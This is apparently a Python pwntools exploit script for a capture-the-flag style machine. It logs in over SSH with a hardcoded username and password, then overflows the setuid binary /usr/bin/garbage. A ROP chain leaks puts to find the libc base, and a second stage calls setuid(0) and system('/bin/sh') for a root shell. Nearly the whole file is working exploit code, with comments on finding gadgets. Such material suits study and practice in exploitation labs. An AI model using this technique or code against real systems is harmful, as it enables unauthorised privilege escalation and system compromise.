#!/usr/bin/env python2

from pwn import *

# this program must be initiated with UID 1002

context(os="linux", arch="amd64")   # amd64 = x64 little-endian, ia64 = x64 big-endian
context.log_level = 'DEBUG'
libc = ELF("./r_libc.so.6")
session = ssh("margo", "10.10.10.139", password="iamgod$08")
p = session.process('/usr/bin/garbage')

#p = gdb.debug('./garbage')

junk = "\x90" * 136

# Stage 1: pop-ret-rdi get libc base
# Find the pop_rdi via radare2(BUT BUGS HERE):  r2 ./garbage -> /R blahblah
# Disassemble the ELF and find function: odjdump -D ./garbage | grep blahblah
# Disassemble the ELF and find PLT: objdump -d ./garbage -j .plt
# Find the pop_rdi via ropper: ropper -f ./garbage --search "pop rdi" 
# Outupt of puts disassembled via objdump (the contents inside [] is also comments):  [Linked Call Address in Binary]  401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 [Address in GOT] <puts@GLIBC_2.2.5>

plt_puts = p64(0x401050)
got_puts = p64(0x404028)
pop_rdi = p64(0x40179b)
plt_main = p64(0x401619)

# x86_64 put all args in registers instead of stack in memory

payload1 = junk + pop_rdi + got_puts + plt_puts + plt_main

p.sendline(payload1)
p.recvuntil("access denied.")

# Receive the result and only accept the first 8 bytes(64 bits), remove the LF
# If length != 8, left-justify it to 8 bytes and use the padding of \x00
leaked_puts = p.recv()[:8].strip().ljust(8, "\x00")

log.success("Leaked puts@GLIBC: " + str(leaked_puts))

# Stage 2: according to base, get the offset

# Get the related function address of so file
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh

leaked_puts = u64(leaked_puts)
libc_puts = libc.symbols['puts']
libc_base = leaked_puts - libc_puts
libc_system = libc.symbols['system']
libc_sh = libc.search('/bin/sh').next()
libc_setuid = libc.symbols['setuid']

# Param of setuid(0)
nullparam = p64(0x0)

# Function addresses in the garbage at runtime
systemAddr = p64(libc_base + libc_system)
shAddr = p64(libc_base + libc_sh)
setuidAddr = p64(libc_base + libc_setuid)

# setuid(0) + system('/bin/sh')
payload2 = junk + pop_rdi + nullparam + setuidAddr + pop_rdi + shAddr + systemAddr

p.sendline(payload2)
p.recvuntil("access denied.")

p.interactive()
